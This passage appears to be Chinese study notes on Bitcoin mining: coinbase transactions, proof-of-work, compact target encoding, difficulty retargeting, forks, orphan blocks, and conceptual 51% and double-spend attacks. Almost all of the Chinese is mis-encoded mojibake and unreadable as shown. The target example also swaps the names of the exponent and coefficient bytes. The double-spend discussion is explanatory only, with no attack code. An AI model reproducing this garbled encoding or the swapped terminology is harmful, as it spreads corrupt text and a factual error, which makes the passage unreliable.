å½“ä¸€ä¸ªnodeéªŒè¯äº†transactionsä¹‹åï¼Œå°±ä¼šå°†ä»–ä»¬æ”¾å…¥æœ¬åœ°çš„ memory pool, or transaction pool å½“ä¸­ï¼Œç„¶åæ¥ç€è¢«æ”¾å…¥æ–°çš„ candidate blockå½“ä¸­ï¼Œå½“ä¸€ä¸ªæ–°çš„blockåˆ°æ¥ä¹‹åï¼ŒJingçš„miner nodeä¼šé¦–å…ˆæ˜ç™½å½“å‰blockå·²ç»ç«äº‰å¤±è´¥ï¼Œé‚£ä¹ˆä¼šä¸¢å¼ƒå½“å‰çš„candidate blockè¿›è€Œåˆ›å»ºæ–°çš„candidate blockæ¥ç«äº‰ä¸‹ä¸€ä¸ªblockï¼ŒåŒæ—¶å°†æ–°åˆ°æ¥çš„blockäºæœ¬åœ°çš„memory poolä¸­çš„transactionè¿›è¡Œæ¯”è¾ƒï¼Œå‰”é™¤é‚£äº›å·²ç»è¢«åŒ…å«åœ¨blockä¸­çš„transaction   The Coinbase Transaction\næˆ‘ä»¬åœ¨ä¹‹å‰çš„ç« èŠ‚ä¸­å°±ä»‹ç»è¿‡ï¼Œcoinbase transactionå°±æ˜¯ä¸€æ¡ç‰¹æ®Šçš„transactionï¼Œç”±mineræ‰€åˆ›å»ºï¼ŒåŒ…å«åœ¨æ–°çš„candidate blockå½“ä¸­ï¼Œä½œä¸ºæ–°çš„blockæŒ–æ˜çš„å¥–åŠ±ï¼Œå¥–åŠ±çš„æ•°å€¼æ¯å››å¹´å‡åŠï¼Œè¿™äº›éƒ½éœ€è¦minerè‡ªè¡Œè®¡ç®—å¹¶æ„é€ coinbase transaction æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿä¸€ä¸‹ä»¥ä¸‹çš„transactionå’Œä¹‹å‰æˆ‘ä»¬åœ¨ç¬¬å…­ç« ä¸­è§è¿‡çš„æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œä¸»è¦æ˜¯åœ¨inputsè¿™ä¸€å—ï¼Œæ²¡æœ‰å†æŒ‡å‘ä¸€ä¸ªç‰¹å®šçš„UTXO,è€Œæ˜¯ä¸€ä¸ªcoinbase  é€šè¿‡ä¸‹å›¾æˆ‘ä»¬ä¹Ÿå¯ä»¥æ¯”è¾ƒæ™®é€šçš„transactionä¸coinbase transactionçš„åŒºåˆ« ä¹‹åæ˜¯Transaction feeçš„è®¡ç®—ï¼Œæˆ‘ä»¬åœ¨ç¬¬ä¹ç« ä¸­æåˆ°è¿‡ï¼Œtransaction feeæ˜¯unallocated valueï¼Œåªéœ€è¦ç”¨inputså‡å»outpuså³å¯ Total Transaction Fees = Sum(Inputs) - Sum(Outputs) å†åŠ ä¸Šcoinbase transactionçš„å€¼å°±å¯ä»¥å¾—åˆ°æ€»çš„rewardã€‚     Constructing the Block Header\nåœ¨å¼€å§‹miningå·¥ä½œä¹‹å‰ï¼Œmineréœ€è¦å…ˆæ„é€ å¥½è¿™æ ·ä¸€ä¸ªblock headerç„¶åï¼Œå¡«å¥½å‡ºäº†Nonceä¹‹å¤–çš„æ‰€æœ‰fieldsï¼Œæœ€åçš„miningçš„ç›®æ ‡å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªç‰¹å®šçš„nonceï¼Œä½¿æ„æˆçš„block hashå°äºtargetçš„å€¼ï¼Œä¸€ä¸ªmining nodeéœ€è¦å°è¯•åäº¿æˆ–è€…æ•°ä¸‡äº¿çš„nonceæ‰èƒ½æ‰¾åˆ°ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„ã€‚ å…³äºtargetçš„ä»‹ç»æˆ‘ä»¬ä¼šæ”¾åˆ°åé¢ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå°†å…¶å½“ä½œæ˜¯ä¸€ä¸ªéœ€è¦è§£å†³çš„puzzle,è€Œminingçš„ç›®çš„å°±æ˜¯è§£å†³è¿™ä¸ªpuzzle    Mining the Block ç®€å•æ¥è¯´ï¼ŒminingæŒ–çŸ¿çš„è¿‡ç¨‹å°±æ˜¯ä¸æ–­çš„hashå¾—åˆ°block header hash,åªæ”¹å˜ä¸€ä¸ªå˜é‡ï¼ˆNonceï¼‰ï¼Œç›´åˆ°åŒ¹é…åˆ°ä¸€ä¸ªç‰¹å®šçš„targetå€¼ Proof-of-Work Algorithm æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬é€šè¿‡å‡ ä¸ªä¾‹å­ï¼Œæ¥è¯´æ˜æ•´ä¸€ä¸ªPOW algorithm. æƒ³è±¡å°æœ‹å‹ä»¬åœ¨ç©ä¸€ä¸ªæ¸¸æˆï¼Œç”¨ä¸¤ä¸ªéª°å­ï¼Œè°å…ˆæ·å‡ºç»“æœå°äº12çš„å€¼å°±ç®—è·èƒœï¼Œè¿™æ˜¯ä¸æ˜¯éå¸¸ç®€å•ï¼Œå› ä¸ºåªè¦ä¸æ˜¯ä¸¤ä¸ª6ï¼Œå°±èƒ½å–èƒœã€‚é‚£ä¹ˆéšç€è¦æ±‚å°äºçš„æ•°å€¼å˜å¾—è¶Šå°ï¼Œé‚£ä¹ˆéœ€è¦å°è¯•çš„æ¬¡æ•°æ˜¯ä¸æ˜¯è‡ªç„¶å°±éœ€è¦å¢å¤šï¼Œå½“è¦æ±‚å°äº3æ‰èƒ½è·èƒœçš„æ—¶å€™ï¼Œåªæœ‰ä¸€ç§å¯èƒ½å¯ä»¥è·èƒœï¼Œé‚£ä¹ˆéœ€è¦æŠ•æ·çš„æ¬¡æ•°å°±è¾¾åˆ°äº†æœ€é«˜ï¼Œæ¦‚ç‡å­¦æˆ‘å·²ç»å¿˜çš„å·®ä¸å¤šäº†ï¼ˆå¤§æ¦‚çš„æ„æ€å¤§å®¶æ‡‚å°±å¥½äº†ï¼Œå…·ä½“çš„æ•°å€¼æˆ‘ä¹Ÿä¸ç®—å‡ºæ¥æç¬‘äº†ï¼‰ æ˜¯ä¸æ˜¯æœ‰ç‚¹ç±»ä¼¼æˆ‘ä»¬çš„ä¹‹å‰æåˆ°çš„æŒ–çŸ¿çš„ç›®æ ‡ï¼Œå°±æ˜¯é€šè¿‡ä¸æ–­çš„å°è¯•æ¥è¾¾åˆ°ä¸€ä¸ªç‰¹å®šçš„ç¬¦åˆè¦æ±‚çš„å€¼ã€‚ å†æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼Œå‡è®¾æˆ‘ä»¬éœ€è¦ä¸€ä¸ªnonceï¼ŒåŠ åœ¨\u0026quot;I am Satoshi Nakamoto\u0026quot;çš„åé¢ï¼Œå†åˆ©ç”¨SHA256 hashä¹‹åï¼Œå¾—åˆ°çš„ç»“æœä»¥0ä¸ºå¼€å¤´ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç®€å•çš„ä»¥æ•°å­—é€’å¢æ¥ç±»æ¯”æ·éª°å­å°è¯•ï¼Œå°±ä¼šæ˜¯è¿™æ ·ï¼š  æˆ‘ä»¬é€šè¿‡è§‚å¯Ÿå¯ä»¥å‘ç°ï¼Œç®€å•çš„ä¸€ä½æ•°å­—çš„å˜åŒ–ï¼Œå¯ä»¥è®©æœ€åçš„hashå€¼å‘ç”Ÿå¾ˆå¤§çš„å˜åŒ–ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬é¢‘ç¹çš„çœ‹åˆ°hashå†bitcoinçš„å‡ºç°ï¼Œå› ä¸ºä»»ä½•é•¿åº¦çš„å†…å®¹å†ç»è¿‡äº†hashä¹‹åï¼Œéƒ½ä¼šç”Ÿæˆæ¯ä¸€ä½éƒ½å®Œå…¨éšæœºï¼Œä¸”ç®€å•çš„å˜åŒ–inputä¼šé€ æˆoutputçš„å·¨å¤§å˜åŒ–çš„hashå€¼ï¼Œä¸”æ²¡æœ‰åŠæ³•æ‰¾åˆ°ä¸€ä¸ªç‰¹å®šçš„hashå€¼çš„inputsï¼Œä¹Ÿæ²¡æœ‰åŠæ³•æ‰¾åˆ°å¦ä¸€ä¸ªinputä¸å½“å‰çš„inputæœ‰ç›¸åŒçš„hashå€¼ã€‚ é‚£æˆ‘ä»¬æ¥ç€å›åˆ°ä¾‹å­ï¼Œè§‚å¯Ÿhashçš„ç»“æœå¯ä»¥å‘ç°å½“nonce = 13çš„æ—¶å€™ï¼Œhashçš„å€¼ç¬¬ä¸€ä½æ˜¯0äº†ï¼Œä¹Ÿå°±æ˜¯hashå€¼å°äºï¼š 0x1000000000000000000000000000000000000000000000000000000000000000 æœ€åï¼Œæˆ‘ä»¬æ¥è¯´è¯´å…·ä½“çš„Proof of Work algorithm æ˜¯å¦‚ä½•å·¥ä½œçš„ å›å¿†ä¸€ä¸‹block headerä¸­çš„fieldsï¼Œæœ‰targetï¼Œæœ‰nonceï¼Œtargetå°±æ˜¯éª°å­æ¸¸æˆè·èƒœçš„è¦æ±‚ï¼Œä¹Ÿæ˜¯æœ€åè®¡ç®—çš„ç»“æœï¼Œnonceï¼Œå°±æ˜¯éœ€è¦ä¸æ–­å°è¯•çš„å†…å®¹ï¼Œè€Œæ•´ä¸€ä¸ªblock headerå°±æ˜¯ä¸Šä¸€ä¸ªä¾‹å­ä¸­å’ŒnonceåŠ åœ¨ä¸€èµ·hashçš„\u0026quot;I am Satoshi Nakamoto\u0026quot;ï¼Œé‚£ä¹ˆæ¯ä¸€ä¸ªblock header é‡Œé¢çš„å†…å®¹éƒ½åŒ…å«äº†å¾ˆå¤šç‰¹æœ‰çš„ä¿¡æ¯ï¼Œä¹Ÿå°±æ„å‘³ç€ä»–ä»¬çš„hashéƒ½ä¼šéå¸¸çš„ä¸åŒï¼Œä¹Ÿå°±ä¿è¯äº†miningçš„å·¥ä½œåªèƒ½ä¸åœçš„åšå°è¯•ã€‚ Target Representation è‡³æ­¤ï¼Œæˆ‘ä¹Ÿå°±ç†è§£äº†targetçš„ç»“æ„çš„ä½œç”¨ï¼š Targetç”±4ä¸ªbytesç»„æˆï¼Œç”¨æ¥æŒ‡ä»£ä¸€ä¸ªå¹‚è¿ç®—ï¼Œç¬¬ä¸€ä¸ª8ä½çš„byteï¼Œç”¨æ¥è¡¨ç¤ºæŒ‡æ•°ï¼Œåé¢ä¸‰ä¸ªbytesä¸€å…±24ä½ï¼Œç”¨æ¥è¡¨ç¤ºä¸€ä¸ªç³»æ•°ï¼Œç®—å‡ºçš„ç»“æœï¼Œå°±æ˜¯æˆ‘ä»¬éœ€è¦æœ€åçš„block header hashéœ€è¦å°äºçš„å€¼ã€‚ æ¯”å¦‚block 277,316çš„target bitså°±æ˜¯0x1903a30cï¼Œ0x19 å°±æ˜¯coefficientæŒ‡æ•°ï¼Œ0x03a30cå°±æ˜¯exponentç³»æ•° Targetçš„è®¡ç®—å…¬å¼æ˜¯ï¼š target = coefficient * 2^(8 * (exponent â€“ 3)) target = 0x03a30c * 2^(0x08 * (0x19 - 0x03))^ =\u0026gt; target = 0x03a30c * 2^(0x08 * 0x16)^ =\u0026gt; target = 0x03a30c * 2^0xB0^ åè¿›åˆ¶è¡¨è¾¾ï¼š =\u0026gt; target = 238,348 * 2^176^ =\u0026gt; target = 22,829,202,948,393,929,850,749,706,076,701,368,331,072,452,018,388,575,715,328 åå…­è¿›åˆ¶è¡¨è¾¾ï¼š =\u0026gt; target = 0x0000000000000003A30C00000000000000000000000000000000000000000000 é‚£ä¹ˆè°ƒæ•´éš¾åº¦çš„æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œå°±å’Œæ·éª°å­ä¸€æ ·ï¼Œä¸‹è°ƒtargetçš„å¤§å°å³å¯ï¼Œå…·ä½“çš„åšæ³•å°±æ˜¯å¢åŠ å¼€å¤´çš„0å°±å¥½äº†ï¼Œé«˜ä½çš„0è¶Šå¤šï¼Œæ„å‘³ç€ç»“æœè¶Šå°ï¼Œæ„å‘³æ‰¾åˆ°åŒ¹é…hashå€¼çš„æ¦‚ç‡è¶Šä½ï¼Œéœ€è¦åšçš„å°è¯•å°±è¶Šå¤§ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæ¯å¤šä¸€ä½0ï¼Œéœ€è¦çš„æ—¶é—´å°±ä¼šç¿»å€ï¼ˆåŒ¹é…çš„å€¼çš„æ•°é‡ä¼šå‡åŠï¼‰ å½“nonceè®¡ç®—å®Œæ¯•ä¹‹åï¼Œå…¶ä»–full nodeåªéœ€è¦å°†block header hashä¸targetä¸€åšæ¯”è¾ƒå°±çŸ¥é“äº†ã€‚ Retargeting to Adjust Difficulty é‚£ä¹ˆæ•´ä¸€ä¸ªå»ä¸­å¿ƒåŒ–çš„ç½‘ç»œè¦å¦‚ä½•ç»Ÿä¸€çš„è°ƒæ•´éš¾åº¦å‘¢ï¼Ÿ æ¯ä¸€ä¸ªnodeéƒ½ä¼šç‹¬ç«‹åœ°ï¼Œè‡ªåŠ¨åœ°è°ƒæ•´éš¾åº¦ï¼Œä¹Ÿå°±æ˜¯targetï¼Œæ¯éš”2,016ä¸ªblocksï¼Œæ‰€æœ‰çš„blockéƒ½ä¼šè®¡ç®—ä¹‹å‰çš„2,016ä¸ªblocksæ‰€éœ€è¦miningçš„æ€»æ—¶é—´ï¼Œå¦‚æœè¶…å‡ºäº†æ¯10minæ¯ä¸ªï¼Œå°±ä¼šé™ä½éš¾åº¦ï¼Œå¦‚æœå°‘äº10minæ¯ä¸ªï¼Œå°±ä¼šå¢åŠ éš¾åº¦ï¼š New Target = Old Target * (Actual Time of Last 2016 Blocks / 20160 minutes) Successfully Mining the Block ä¸€æ¬¡æˆåŠŸçš„æŒ–çŸ¿è¿‡ç¨‹åº”è¯¥å°±æ˜¯Jingåœ¨å…¶mining nodeä¸Šç»„è£…å¥½äº†block headerä¹‹åï¼Œå°†è¿™ä¸ªblock headerå‘é€ç»™æ‰€æœ‰çš„é«˜æ€§èƒ½æœºå™¨å»è¿›è¡Œhashçš„å°è¯•ï¼Œç›´åˆ°è¯•å‡ºäº†åŒ¹é…targetçš„nonceåï¼Œmining nodeå°±ä¼šå°†è¿™ä¸ªblockè½¬å‘å‡ºå»ï¼Œå…¶ä»–mining nodeåœ¨éªŒè¯äº†è¿™ä¸ªblockä¹‹åï¼Œå°±ä¼šæ”¾å¼ƒè‡ªå·±å½“å‰çš„candidate blockå¹¶åŠ Jingçš„blockæ·»åŠ åˆ°æœ¬åœ°çš„blockchainä¸Šï¼Œå¹¶å°†å…¶block header hashä½œä¸ºæ–°çš„candidate blockçš„previous hash,è¿™å…¶å®ä¹Ÿæ˜¯ä¸€ç§æŠ•ç¥¨çš„ä»£è¡¨ï¼Œå³è¡¨ç¤ºè®¤åŒJingçš„blockï¼Œå¹¶å°†è‡ªå·±çš„ç®—åŠ›è¿ç”¨åœ¨Jingçš„block header hashä¸Šã€‚ Validating a New Block æ¯ä¸€ä¸ªbitcoin nodeéƒ½ä¼šé€šè¿‡ä¸€ç³»åˆ—çš„æ ‡å‡†éªŒè¯æ–°åˆ°æ¥çš„blockï¼Œåªè¦æœ‰ä¸€ä¸ªæ²¡æœ‰ç¬¦åˆæ ‡å‡†ï¼Œé‚£ä¹ˆæ•´ä¸€ä¸ªblockå°±ä¼šä½œåºŸï¼Œå¦‚æœmineråœ¨ä¸€äº›å†…å®¹ä¸Šåšäº†ä¸€äº›æ¬ºéª—ï¼Œæ¯”å¦‚æŠŠcoinbase transaction å†™çš„å¾ˆå¤§ï¼Œç„¶åå†èŠ±å¤§é‡çš„ç®—åŠ›æ¥å®Œæˆproof-of-works algorithmï¼Œé‚£ä¹ˆä»–ä»¬å°±ä¼šæµªè´¹æ‰€æ¶ˆè€—çš„æ‰€æœ‰ç”µè´¹è€Œåšäº†ä¸€æ¬¡æ— ç”¨åŠŸã€‚è¿™ä¸ªæ£€æŸ¥å°†ä¼šåŒ…æ‹¬block headerçš„fieldsï¼Œä¹Ÿä¼šåŒ…å«ä¸€äº›ä¾‹å¦‚å¤§å°çš„metadataï¼ŒåŒæ—¶åˆ«å¿˜äº†ä¹‹å‰æåˆ°è¿‡çš„æ‰€æœ‰transactionçš„éªŒè¯ã€‚ Assembling and Selecting Chains of Blocks Bitcoin å»ä¸­å¿ƒåŒ–å…±è¯†æœºåˆ¶çš„æœ€åä¸€ä¸ªæ­¥éª¤å°±æ˜¯å°†éªŒè¯å¥½çš„blocké“¾æ¥åˆ°blockchainä¸Šé¢å»ï¼Œå¤§å®¶æ³¨æ„åˆ°æ ‡é¢˜ä¸Šæœ‰ä¸€ä¸ªselecting chainsçš„å­—çœ¼ï¼Œæ²¡é”™ï¼Œæœ€åä¸€æ­¥è¿˜é¢ä¸´ç€chainsçš„é€‰æ‹©ï¼Œè¿™ä¹Ÿæ„å‘³ç€å¯ä»¥é“¾æ¥çš„chainä¸åªä¸€æ¡ï¼Œè¿™ä¸æˆ‘ä»¬ä¹‹åè¦è®²åˆ°çš„ Fork çš„æœ‰å…³ã€‚ æ¯ä¸€ä¸ªNodeså°†ç»´æŠ¤ä¸‰ç§åŒºå—  é“¾æ¥åœ¨ä¸»é“¾ä¸Šçš„åŒºå—  é“¾æ¥åœ¨ä¸»é“¾åˆ†æ”¯ä¸Šçš„åŒºå—  å­¤å„¿åŒºå—ï¼Œä¹Ÿå°±æ˜¯æ‰¾ä¸åˆ°çˆ¶åŒºå—çš„åŒºå—   æˆ‘ä»¬è¿™é‡Œç›´æ¥å¼€å§‹ä»‹ç»Forkçš„æ¦‚å¿µï¼Œå¦åˆ™æˆ‘è§‰å¾—chainçš„å˜åŠ¨çš„é—®é¢˜å¾ˆéš¾ç†è§£ Blockchain Forks Forkè¿™ä¸ªæ¦‚å¿µå‘ç”Ÿåœ¨ä¸¤ä¸ªmining nodeåŒæ—¶æŒ–å‡ºäº†ä¸€ä¸ªåˆæ³•çš„blockï¼Œé‚£ä¹ˆä»–ä»¬åœ¨éªŒè¯äº†proof-of-work algorithmçš„ä¸€ç¬é—´å°±ä¼šå°†è¿™ä¸ªæ–°çš„blockä¼ æ’­å‡ºå»ï¼Œå¾ˆæ˜¾ç„¶ç¦»è¿™ä¸¤ä¸ªmining nodeè¶Šè¿‘çš„nodeå°†ä¼šè¶Šæ—©æ”¶åˆ°è¿™ä¸ªæ–°çš„blockï¼Œä½†æ˜¯æœ€ç»ˆæ•´ä¸ªbitcoin networkä¸Šçš„æ‰€æœ‰nodeï¼Œéƒ½ä¼šæœ‰ä¸¤ä¸ªæ–°çš„blockæ¥æŒ‡å‘ä¸Šä¸€ä¸ªçˆ¶åŒºå— ä¸‹å›¾çš„ç»“æ„å°±æ˜¯æ¯ä¸€ä¸ªnodeè¿æ¥åœ¨ä¸€èµ·ï¼Œå½¢æˆæ•´ä¸€ä¸ªbitcoin network,åŒæ—¶åœ†åœˆä¸­çš„æ˜Ÿæ˜Ÿå°±è¡¨ç¤ºblockchainçš„æœ«ç«¯ï¼Œæœ€æ–°çš„ä¸€ä¸ªblockï¼Œåœ¨è¿™ä¸ªæ—¶å€™ï¼Œæ‰€æœ‰çš„nodeä¸­çš„blockchainéƒ½æ˜¯ä¸€æ ·çš„ã€‚  é‚£ä¹ˆæ­¤æ—¶ï¼ŒNode Xå’ŒNode YåŒæ—¶è®¡ç®—å‡ºäº†æ–°çš„block,æˆ‘ä»¬ç”¨ä¸‰è§’å’Œå€’ä¸‰è§’è¡¨ç¤ºï¼Œç„¶åä»–ä»¬å¼€å§‹ä¼ é€’è¿™ä¸ªæ–°çš„blockï¼ŒX ä¸ Yå‘¨å›´çš„nodeéƒ½ä¼šæ›´ä¼˜å…ˆæ”¶åˆ°ä»–ä»¬çš„block  ä½†æ˜¯æœ€ç»ˆï¼Œä»–ä»¬çš„blockchainä¸Šå‰ä¸€ä¸ªçˆ¶åŒºå—ä¸Šéƒ½ä¼šè¿ç€ä¸¤ä¸ªæ–°çš„blockï¼Œä»–ä»¬éƒ½å¯ä»¥ç®—æ˜¯åˆæ³•çš„ï¼Œé‚£ä¹ˆä¸€å¦‚æ—¢å¾€ï¼Œæ¯ä¸€ä¸ªmining nodeå°±ä¼šä»¥å…¶ä¸­ä¸€ä¸ªblockï¼Œæ­£ä¸‰è§’æˆ–è€…å€’ä¸‰è§’ä½œä¸ºprevious block hash è¿›è¡Œæ–°çš„blockçš„è®¡ç®—ã€‚  è¿™æ—¶å€™ï¼Œæ€»æœ‰ä¸€ä¸ªèŠ‚ç‚¹ä¼šç®—å‡ºæ–°çš„ä¸€ä¸ªblockï¼Œæ ¹æ®å…¶é€‰ä¸­çš„previous block hash,è¿™é‡Œä¹Ÿèƒ½æ›´å¥½çš„ä½“ç°æˆ‘ä»¬ä¹‹å‰è¯´çš„ç®—åŠ›æŠ•ç¥¨çš„é—®é¢˜ï¼Œå½“æœ‰ä¸¤ä¸ªèŠ‚ç‚¹åŒæ—¶åˆæ³•çš„æ—¶å€™ï¼Œæ¯ä¸€ä¸ªmining nodeéƒ½ä¼šåšå‡ºè‡ªå·±çš„é€‰æ‹©æ¥é€šè¿‡è¡ŒåŠ¨ï¼ˆhashè®¡ç®—ï¼‰æ¥æ”¯æŒå…¶ä¸­çš„ä¸€ä¸ªnodeã€‚  å½“è¿™ä¸ªæ–°çš„blockäº§ç”Ÿçš„æ—¶å€™ï¼Œè¿›è€Œæ‰©æ•£åˆ°æ•´ä¸€ä¸ªbitcoin networkï¼Œé‚£ä¹ˆæ¯ä¸ªnodeåœ¨éªŒè¯è¿‡åå°±ä¼šæ ¹æ®previous block hashé“¾æ¥åˆ°å…¶ä¸­ä¸€ä¸ªç«äº‰çš„blockä¸Šï¼Œæœ€ç»ˆå½¢æˆäº†ä¸€æ¡æ›´é•¿çš„chainï¼ŒåŒæ—¶ä¹Ÿæ„å‘³ä»˜å‡ºäº†æ›´å¤šçš„ç®—åŠ›ï¼Œæˆ‘ä»¬ç§°è¿™æ¡chainä¸ºmain chain ä¸»é“¾ã€‚  é‚£äº›â€œç«™é”™é˜Ÿâ€çš„mining nodeå°†ä¼šé©¬ä¸Šåœæ­¢æ‰‹ä¸­çš„å·¥ä½œï¼Œå¼€å§‹ä¸ºæ–°çš„ä¸»é“¾è¿›è¡Œè®¡ç®—ï¼Œå› ä¸ºä¹‹åè®¡ç®—çš„blockéƒ½ä¼šå˜æˆorphanå­¤å„¿åŒºå— æœ‰äº†Forkçš„æŒ‡ç¤ºä¹‹åæˆ‘ä»¬å†æ¥è¯´ä¸»é“¾ï¼Œåˆ†æ”¯çš„æ¦‚å¿µå°±å®¹æ˜“çš„å¤šäº†  Main chain ä¸»é“¾ï¼Œä¹Ÿå°±æ˜¯æ‹¥æœ‰æœ€é•¿çš„ï¼Œä¹Ÿå°±æ˜¯ä»˜å‡ºäº†æ›´å¤šç®—åŠ›çš„é“¾ main chainä¸Šå¯èƒ½ä¹Ÿä¼šæœ‰åˆ†æ”¯åŒºå—ï¼Œè¿™äº›åˆ†æ”¯å°†è¢«ä¿ç•™ä¸‹æ¥ï¼Œå› ä¸ºå¯èƒ½åœ¨å°†æ¥ç”¨æ¥å–ä»£ç°æœ‰çš„main chain  Orphan block å­¤å„¿åŒºå—ï¼Œé¡¾åæ€ä¹‰ï¼Œä»–ä»¬çš„å„é¡¹æ ‡å‡†éƒ½è¢«éªŒè¯ä¼šåˆæ³•ï¼Œå¯æ˜¯previous block hashå´æ‰¾ä¸åˆ°ä¸€ä¸ªå­˜åœ¨çˆ¶åŒºå—å¯ä»¥åŒ¹é… è¿™ç§åŒºå—å¯èƒ½ä¼šå‘ç”Ÿåœ¨å‰åä¸¤ä¸ªblock çš„è®¡ç®—æ—¶é—´é—´éš”å¾ˆçŸ­ï¼ŒåŒæ—¶å­åŒºå—çš„ä¼ æ’­å¿«äºçˆ¶åŒºå—ï¼Œå¯¼è‡´äº†å­åŒºå—å…ˆè¾¾åˆ°å´å°´å°¬çš„å‘ç°æ²¡æœ‰çˆ¶åŒºå—å¯ä»¥è¿æ¥ é‚£ä¹ˆè¿™äº›åŒºå—å°±ä¼šè¢«æ”¾åœ¨orphan block poolä¸­ç­‰å¾…å¯ä»¥é“¾æ¥çš„çˆ¶åŒºå—çš„åˆ°æ¥   Consensus Attacks Bitcoinåœ¨ç†è®ºæ˜¯æ˜¯å¯ä»¥è¢«æ”»å‡»çš„ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¹Ÿä»…ä»…æ˜¯é’ˆå¯¹æœªæ¥çš„consensuså…±è¯†ï¼Œæˆ–è€…æœ€è¿‘çš„å‡ ä¸ªblockï¼ˆæœ€è¿‘çš„å‡ åä¸ªï¼‰ï¼Œå› ä¸ºéšç€blockchainçš„å˜é•¿ï¼Œè¶Šæ—©çš„blockå°±è¶Šä¸å®¹æ˜“è¢«æ”¶åˆ°å½±å“ï¼Œå°±åƒæˆ‘ä»¬ä¹‹å‰ä¸¾çš„åœ°è´¨å±‚çš„ä¾‹å­ä¸€æ ·ã€‚Consensus attacksåªèƒ½å½±å“æœ€è¿‘çš„blocksä»¥åŠé€ æˆé’ˆå¯¹æœªæ¥blocksåˆ›å»ºçš„DoSæ”»å‡»ã€‚ å…¶ä¸­ä¸€ä¸ªåœºæ™¯å°±æ˜¯\u0026quot;51% attack\u0026quot;ï¼Œä¹Ÿå°±æ˜¯å½“attackersèƒ½å¤Ÿæ§åˆ¶è¶…è¿‡åŠæ•°çš„hashing powerï¼Œå°±å¯ä»¥æˆåŠŸçš„æ”»å‡»bitcoinï¼Œæœ‰ä¸‰ç§æ”»å‡»çš„æ‰‹æ®µ  deliberate forks  double-spend transactions  DoS attacks   å…¶å®æ ¹æ®ç ”ç©¶ä¸éœ€è¦51%çš„ç®—åŠ›ï¼Œåªè¦èƒ½å¤Ÿæ§åˆ¶è¶…è¿‡1/3æˆåŠŸçš„æ¦‚ç‡å°±å·²ç»å¾ˆé«˜äº†  Fork/double-spend attack ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†æœ€è¿‘çš„blockæ— æ•ˆåŒ–ï¼Œé€šè¿‡forkä¸€ä¸ªåŒºå—ï¼Œç„¶åé€šè¿‡æŒæ¡å¤§é‡çš„ç®—åŠ›ï¼Œä½¿main chainåˆ‡æ¢åˆ°æ–°forkçš„åŒºå—é“¾åˆ†æ”¯ä¸Šæ¥  è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ä¸€ä¸ªdouble-spend attackåªèƒ½åœ¨attackeræ‹¥æœ‰ç›®æ ‡transactionä¸­çš„inputsçš„åˆæ³•signatureçš„æƒ…å†µä¸‹æ‰èƒ½è¿›è¡Œ     æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªå…·ä½“çš„ä¾‹å­æ¥è¯´æ˜ä¸€ä¸ªdouble-spend attackæ˜¯å¦‚ä½•å‘ç”Ÿçš„ æœ‰ä¸€ä¸ªAttacker Malloryæƒ³è¦ä»Carolçš„ç”»å»Šä¸­ä¹°ä¸€å‰¯ä»·å€¼å¾ˆé«˜çš„ç”»ä½œï¼Œä»–åœ¨ä»˜æ¬¾ä¹‹åï¼Œç”»å»Šåœ¨æœ€æ–°çš„ä¸€ä¸ªblockä¸Šç¡®è®¤äº†transactionï¼Œäºæ˜¯å°±æŠŠç”»äº¤ç»™äº†Malloryã€‚ä½†æ˜¯äºæ­¤åŒæ—¶ï¼ŒMalloryæœ‰ä¸€ä¸ªå¸®æ‰‹å«åšPaulï¼Œä»–è¿è¥è¿™ä¸€ä¸ªmining poolï¼Œæ§åˆ¶äº†ç›¸å½“å¤§çš„ç®—åŠ›ï¼Œä»–ç›´æ¥é‡æ–°mine/forkäº†ç›¸åŒé«˜åº¦çš„è¿™ä¸ªblockï¼Œæ”¹å†™äº†transactionï¼Œå°†åŸæœ¬éœ€è¦èŠ±è´¹ç»™ç”»å»Šçš„UTXOè½¬å‘äº†è‡ªå·±çš„é’±åŒ…ï¼Œå¹¶åˆç®—äº†ä¸€ä¸ªblockä½¿å½“å‰çš„chainå˜å¾—æ¯”åŸæ¥çš„æ›´é•¿ï¼Œæˆä¸ºäº†ä¸»é“¾ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€åŸæœ¬çš„blockå¤±æ•ˆäº†ï¼Œtransactionä¹Ÿå°±æ— æ•ˆäº†ï¼Œé‚£ä¹ˆè¿™ä¸ªUTXOå…¶å®ä¹Ÿå°±æ— æ³•è¢«æ¶ˆè´¹äº†ã€‚å› æ­¤ï¼Œå¯¹äºå¤§æ•°å€¼çš„äº¤æ˜“æ¥è¯´ï¼Œæœ€å¥½å¯ä»¥é‡‡ç”¨ç¬¬ä¸‰æ–¹æ‹…ä¿çš„æ‰‹æ®µæ¥è¿›è¡Œäº¤æ˜“ï¼Œå¹¶ä¸”ç­‰å¾…6ä¸ªä»¥ä¸Šçš„blockéƒ½ç¡®è®¤äº†è¿™æ¡transactionä¹‹åï¼Œæ‰ä¼šæ¯”è¾ƒç¨³å¦¥ã€‚ å½“ç„¶ï¼Œä¸€æ—¦æœ‰ä¸€æ–¹äººå‘˜æ‹¥æœ‰è¿™æ ·åºå¤§çš„ç®—åŠ›ï¼Œå¹¶å¼€å§‹ç ´åbitcoinçš„è¿è¡Œï¼Œé‚£ä»–ä»¬è‚¯å®šä¸æ˜¯å†²ç€é’±å»çš„ï¼Œæˆ–è€…è¯´ä¸æ˜¯ä¸ºäº†ä»bitcoinä¸­ç›´æ¥è·åˆ©çš„ï¼Œå› ä¸ºä¸€æ—¦å»ä¸­å¿ƒåŒ–çš„å…±è¯†å®‰å…¨æœºåˆ¶è¢«ç ´åï¼Œé‚£ä¹ˆæ²¡æœ‰äººä¼šç›¸ä¿¡è¿™ä¸ªç³»ç»Ÿï¼Œä»·æ ¼ä¹Ÿä¼šå´©æºƒã€‚ Changing the Consensus Rules åœ¨ä¸Šé¢çš„ç« 